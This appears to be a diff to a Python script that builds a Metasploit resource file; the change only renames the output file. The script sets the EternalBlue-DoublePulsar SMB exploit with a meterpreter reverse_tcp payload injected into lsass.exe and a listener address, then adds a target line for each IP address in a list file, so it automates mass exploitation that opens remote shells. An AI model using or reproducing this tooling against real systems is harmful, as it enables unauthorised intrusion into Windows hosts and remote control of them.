@@ -6,7 +6,7 @@ args = parser.parse_args()
 exploit = "exploit/windows/smb/Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar"
 payload = "windows/x64/meterpreter/reverse_tcp"
 
-with open('rhodes.rc','w') as f2:
+with open('out.rc','w') as f2:
     f2.write("use " + exploit + "\n")
     f2.write("set processinject lsass.exe" + "\n")
     f2.write("set targetarchitecture x64" + "\n")
@@ -14,7 +14,7 @@ with open('rhodes.rc','w') as f2:
     f2.write("set LHOST " + args.lhost + "\n")
 
 with open('ip.txt') as f1:
-    with open('rhodes.rc', 'a') as f2:
+    with open('out.rc', 'a') as f2:
         lines = f1.readlines()
         for i, line in enumerate(lines):
             f2.write("set rhost " + line.strip() + "\n")
